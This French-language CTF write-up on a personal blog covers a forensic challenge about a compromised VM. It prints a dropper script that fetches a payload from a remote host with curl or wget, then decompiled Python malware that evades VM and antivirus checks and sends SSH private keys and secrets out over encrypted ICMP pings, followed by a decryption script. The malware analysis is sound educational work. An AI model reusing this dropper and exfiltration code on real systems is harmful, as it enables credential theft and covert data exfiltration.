<!doctype html><html lang=fr-fr dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Mission 3 : Forensic
  
  #
  


  Brief de mission
  
  #
  

La nouvelle vient d&rsquo;être annoncée : l&rsquo;entreprise Quantumcore a été compromise, vraisemblablement à cause d&rsquo;un exécutable téléchargé sur un appareil issu du shadow IT, dont l&rsquo;entreprise ignorait l&rsquo;existence.
Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu&rsquo;un fichier de capture réseau (PCAP) juste avant que l&rsquo;attaquant ne couvre complètement ses traces. À vous d&rsquo;analyser ces éléments et comprendre ce qu&rsquo;il s&rsquo;est réellement passé."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/rootmepro2025/collapsed/mission3/"><meta property="og:site_name" content="@camillegr"><meta property="og:title" content="Mission 3 - Forensic"><meta property="og:description" content="Mission 3 : Forensic # Brief de mission # La nouvelle vient d’être annoncée : l’entreprise Quantumcore a été compromise, vraisemblablement à cause d’un exécutable téléchargé sur un appareil issu du shadow IT, dont l’entreprise ignorait l’existence.
Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu’un fichier de capture réseau (PCAP) juste avant que l’attaquant ne couvre complètement ses traces. À vous d’analyser ces éléments et comprendre ce qu’il s’est réellement passé."><meta property="og:locale" content="fr_fr"><meta property="og:type" content="article"><meta property="article:section" content="docs"><title>Mission 3 - Forensic | @camillegr</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=//localhost:1313/docs/writeups/rootmepro2025/collapsed/mission3/><link rel=stylesheet href=/book.min.bb3e87f07d36c204e64f36f7b234cbfca24038b4a3f644b253b84740bc8ac74b.css integrity="sha256-uz6H8H02wgTmTzb3sjTL/KJAOLSj9kSyU7hHQLyKx0s=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.93d6633a78dacfa6129026b437f37946ad7e9d6f7fe46845365e41653b480082.js integrity="sha256-k9ZjOnjaz6YSkCa0N/N5Rq1+nW9/5GhFNl5BZTtIAII=" crossorigin=anonymous></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>@camillegr</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-ad93f8b4ee98a57a6224ee06f39153b9 class=toggle>
<label for=section-ad93f8b4ee98a57a6224ee06f39153b9 class=flex><a role=button class=flex-auto>Projets Personnels</a></label><ul><li><a href=/docs/projets/collapsed/tofuzz/>ToFuzz</a></li></ul></li><li><input type=checkbox id=section-72538655c7e4bb37bc80c6f43d7e4b3b class=toggle checked>
<label for=section-72538655c7e4bb37bc80c6f43d7e4b3b class=flex><a href=/docs/writeups/ class=flex-auto>Writeups</a></label><ul><li><input type=checkbox id=section-14ed21d169f82c1f4e9784c42f27b9c3 class=toggle checked>
<label for=section-14ed21d169f82c1f4e9784c42f27b9c3 class=flex><a href=/docs/writeups/rootmepro2025/ class=flex-auto>CTF 2025 | Root-Me Pro x DGSE</a></label><ul><li><a href=/docs/writeups/rootmepro2025/collapsed/mission1/>Mission 1 - IA</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission2/>Mission 2 - SOC</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission3/ class=active>Mission 3 - Forensic</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission4/>Mission 4 - Pentest</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission5/>Mission 5 - Mobile</a></li><li><a href=/docs/writeups/rootmepro2025/collapsed/mission6/>Mission 6 - OSINT</a></li></ul></li><li><input type=checkbox id=section-661913a3e27635165633fb2069bf836f class=toggle>
<label for=section-661913a3e27635165633fb2069bf836f class=flex><a href=/docs/writeups/vm/ class=flex-auto>Virtual Machines</a></label><ul><li><a href=/docs/writeups/vm/collapsed/mrrobot/>Mr Robot</a></li><li><a href=/docs/writeups/vm/collapsed/rootme/>RootMe</a></li><li><a href=/docs/writeups/vm/collapsed/wonderlands/>Wonderlands</a></li></ul></li></ul></li><li class=book-section-flat><span>Divers</span><ul><li><a href=/docs/divers/blogs/>Blogs</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Mission 3 - Forensic</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#brief-de-mission>Brief de mission</a></li><li><a href=#premiere-recherches>Premiere recherches</a></li><li><a href=#analyse-de-install_npdatesh>Analyse de install_npdate.sh</a></li><li><a href=#decompilation>Decompilation</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=mission-3--forensic>Mission 3 : Forensic
<a class=anchor href=#mission-3--forensic>#</a></h1><h2 id=brief-de-mission>Brief de mission
<a class=anchor href=#brief-de-mission>#</a></h2><p>La nouvelle vient d&rsquo;être annoncée : l&rsquo;entreprise Quantumcore a été compromise, vraisemblablement à cause d&rsquo;un exécutable téléchargé sur un appareil issu du shadow IT, dont l&rsquo;entreprise ignorait l&rsquo;existence.</p><p>Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu&rsquo;un fichier de capture réseau (PCAP) juste avant que l&rsquo;attaquant ne couvre complètement ses traces. À vous d&rsquo;analyser ces éléments et comprendre ce qu&rsquo;il s&rsquo;est réellement passé.</p><p>L&rsquo;entreprise vous met à disposition :</p><ul><li>L&rsquo;image de la VM compromise</li><li>Le fichier PCAP contenant une portion du trafic réseau suspect</li></ul><h2 id=premiere-recherches>Premiere recherches
<a class=anchor href=#premiere-recherches>#</a></h2><p>En regardant les logs et en arrivant sur la machine, on s&rsquo;aperçoit que :</p><ul><li>L&rsquo;attaque a eu lieu entre 14:02 et 14:12</li><li>l&rsquo;utilisateur fournit a les droits root sur la machine</li><li>il y a eu plusieurs telechargement de fichiers, notamment un fichier install_npdate.sh qui contient du code malveillant.</li></ul><h2 id=analyse-de-install_npdatesh>Analyse de install_npdate.sh
<a class=anchor href=#analyse-de-install_npdatesh>#</a></h2><p>On observe le code suivant :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ in <span style=color:#66d9ef>$(</span>seq <span style=color:#ae81ff>1</span> $__CNT<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    __R<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/opt/</span><span style=color:#66d9ef>$(</span>tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 8<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    mkdir -p <span style=color:#e6db74>&#34;</span>$__R<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    __TMPF<span style=color:#f92672>+=(</span><span style=color:#e6db74>&#34;</span>$__R<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__DST<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>__TMPF[$RANDOM % <span style=color:#e6db74>${#</span>__TMPF[@]<span style=color:#e6db74>}</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>__DL<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvbnRwZGF0ZV91dGlsLmNweXRob24tMzcucHlj&#34;</span> | base64 -d<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span>__DLL<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#34;aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvcmVhZG1lLm1k&#34;</span> | base64 -d<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> command -v curl &gt;/dev/null 2&gt;&amp;1; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    curl -fsSL <span style=color:#e6db74>&#34;</span>$__DL<span style=color:#e6db74>&#34;</span> -o <span style=color:#e6db74>&#34;</span>$__DST<span style=color:#e6db74>/.sys&#34;</span>
</span></span><span style=display:flex><span>    curl -fsSL <span style=color:#e6db74>&#34;</span>$__DLL<span style=color:#e6db74>&#34;</span> -o <span style=color:#e6db74>&#34;</span>$__DST<span style=color:#e6db74>/.rdme&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>elif</span> command -v wget &gt;/dev/null 2&gt;&amp;1; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    wget -q <span style=color:#e6db74>&#34;</span>$__DL<span style=color:#e6db74>&#34;</span> -O <span style=color:#e6db74>&#34;</span>$__DST<span style=color:#e6db74>/.sys&#34;</span>
</span></span><span style=display:flex><span>    wget -q <span style=color:#e6db74>&#34;</span>$__DLL<span style=color:#e6db74>&#34;</span> -O <span style=color:#e6db74>&#34;</span>$__DST<span style=color:#e6db74>/.rdme&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;[ntpdate] Error: Neither curl nor wget found.&#34;</span>
</span></span><span style=display:flex><span>    exit <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>chmod +x <span style=color:#e6db74>&#34;</span>$__DST<span style=color:#e6db74>/.sys&#34;</span>
</span></span></code></pre></div><p>Ce morceau de code installe un executable python dans ‘/opt/????/.sys‘ nous cherchons donc cet executable et passons à la décompilation.</p><h2 id=decompilation>Decompilation
<a class=anchor href=#decompilation>#</a></h2><p>Le fichier .pyc compilé, une fois décompilé, donne le résultat suivant :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># uncompyle6 version 3.9.2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Python bytecode version base 3.7.0 (3394)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Decompiled from: Python 3.7.3 (default, Mar 21 2025, 13:10:44) </span>
</span></span><span style=display:flex><span><span style=color:#75715e># [GCC 12.2.0]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Embedded file name: nightshade.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Compiled at: 2025-03-24 11:04:51</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Size of source mod 2**32: 2358 bytes</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os<span style=color:#f92672>,</span> subprocess<span style=color:#f92672>,</span> psutil<span style=color:#f92672>,</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span>__k <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span>)
</span></span><span style=display:flex><span>__v <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;1f2d3c4b5a69788766554433221100ff&#34;</span>)
</span></span><span style=display:flex><span>__d <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;37e0f8f92c71f1c3f047f43c13725ef1&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__b64d</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b64decode(s<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__p</span>(x):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> x <span style=color:#f92672>+</span> bytes([<span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> len(x) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>]) <span style=color:#f92672>*</span> (<span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> len(x) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__u</span>(x):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> x[<span style=color:#66d9ef>None</span>[:<span style=color:#f92672>-</span>x[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]]]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__x</span>(h):
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(__k, AES<span style=color:#f92672>.</span>MODE_CBC, __v)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> __u(c<span style=color:#f92672>.</span>decrypt(bytes<span style=color:#f92672>.</span>fromhex(h)))<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__y</span>(s):
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(__k, AES<span style=color:#f92672>.</span>MODE_CBC, __v)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> c<span style=color:#f92672>.</span>encrypt(__p(s<span style=color:#f92672>.</span>encode()))<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__chk_vm</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        z <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/sys/class/dmi/id/product_name&#34;</span>)<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> q <span style=color:#f92672>in</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;VmlydHVhbEJveA==&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;S1ZN&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;UVFNVQ==&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Qm9jaHM=&#39;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> base64<span style=color:#f92672>.</span>b64decode(q)<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>lower() <span style=color:#f92672>in</span> z:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;ERR VM&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__chk_av</span>():
</span></span><span style=display:flex><span>    targets <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>     <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Y2xhbWQ=&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;YXZnZA==&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;c29waG9z&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;RVNFVA==&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cmtodW50ZXI=&#39;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> psutil<span style=color:#f92672>.</span>process_iter(attrs<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;name&#34;</span>]):
</span></span><span style=display:flex><span>            n <span style=color:#f92672>=</span> (p<span style=color:#f92672>.</span>info[<span style=color:#e6db74>&#34;name&#34;</span>] <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> b64av <span style=color:#f92672>in</span> targets:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> base64<span style=color:#f92672>.</span>b64decode(b64av)<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>lower() <span style=color:#f92672>in</span> n:
</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>&#34;ERR AV&#34;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__exf</span>(path, dst, size<span style=color:#f92672>=</span><span style=color:#ae81ff>15</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(path):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> open(path, <span style=color:#e6db74>&#34;rb&#34;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    segs <span style=color:#f92672>=</span> [d [i[:i <span style=color:#f92672>+</span> size]] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(d), size)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> seg <span style=color:#f92672>in</span> segs:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            payload <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(__k, AES<span style=color:#f92672>.</span>MODE_CBC, __v)<span style=color:#f92672>.</span>encrypt(__p(seg))<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>            <span style=color:#75715e># ping -c 1 -p payload </span>
</span></span><span style=display:flex><span>            cmd <span style=color:#f92672>=</span> [__b64d(<span style=color:#e6db74>&#34;cGluZw==&#34;</span>), __b64d(<span style=color:#e6db74>&#34;LWM=&#34;</span>), __b64d(<span style=color:#e6db74>&#34;MQ==&#34;</span>), __b64d(<span style=color:#e6db74>&#34;LXA=&#34;</span>), payload, dst]
</span></span><span style=display:flex><span>            subprocess<span style=color:#f92672>.</span>run(cmd, stdout<span style=color:#f92672>=</span>(subprocess<span style=color:#f92672>.</span>DEVNULL), stderr<span style=color:#f92672>=</span>(subprocess<span style=color:#f92672>.</span>DEVNULL))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__main</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> __chk_vm():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> __chk_av():
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        __kll <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;/root/.secret&#34;</span>,
</span></span><span style=display:flex><span>         os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>expanduser(<span style=color:#e6db74>&#34;~/.ssh/id_rsa&#34;</span>),
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#34;/root/.ssh/id_rsa&#34;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> f <span style=color:#f92672>in</span> __kll:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(f):
</span></span><span style=display:flex><span>                __exf(f, __x(__d))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        _kkoo <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/root/.secret&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(_kkoo):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;clean&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#                os.remove(_kkoo)</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>finally</span>:
</span></span><span style=display:flex><span>                    e <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>del</span> e
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    __main()
</span></span></code></pre></div><p>On observe que cet executable exfiltre des données vers une autre machine. Le fichier <code>/root/.secret</code>, qui doit contenir notre drapeau, est envoyé par ICMP. On observe également que le contenu est chiffré mais l&rsquo;IV et la clé sont disponibles.</p><p>En extrayant les données des paquets via la capture .pcap, on tombe effectivement sur le drapeau que l&rsquo;on déchiffre avec le code suivant :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__b64d</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b64decode(s<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span>)
</span></span><span style=display:flex><span>iv <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;1f2d3c4b5a69788766554433221100ff&#34;</span>)
</span></span><span style=display:flex><span>HEX<span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;37e0f8f92c71f1c3f047f43c13725ef1&#34;</span>)
</span></span><span style=display:flex><span>encoding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;utf-8&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(crypted) : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>    <span style=color:#75715e># Tronquer à un multiple de 16</span>
</span></span><span style=display:flex><span>    valid_len <span style=color:#f92672>=</span> len(crypted) <span style=color:#f92672>-</span> (len(crypted) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    raw <span style=color:#f92672>=</span> crypted[:valid_len]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Déchiffrement</span>
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>decrypt(raw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Suppression du padding PKCS#7</span>
</span></span><span style=display:flex><span>    pad_len <span style=color:#f92672>=</span> decrypted[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> pad_len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>and</span> pad_len <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>16</span>:
</span></span><span style=display:flex><span>        decrypted <span style=color:#f92672>=</span> decrypted[:<span style=color:#f92672>-</span>pad_len]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Décodage en UTF-8</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> decrypted<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;utf-8&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>UnicodeDecodeError</span>:
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> decrypted<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;utf-8&#34;</span>, errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;replace&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(decrypt(HEX))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;raw_payloads.txt.head&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f :
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> l <span style=color:#f92672>in</span> f<span style=color:#f92672>.</span>readlines() : 
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> l<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        print(decrypt(bytes<span style=color:#f92672>.</span>fromhex(payload)))
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><div class="flex flex-wrap justify-between"><span><a href=/docs/writeups/rootmepro2025/collapsed/mission2/ class="flex align-center book-icon"><img src=/svg/backward.svg class=book-icon alt=Previous title="Mission 2 - SOC">
<span>Mission 2 - SOC</span>
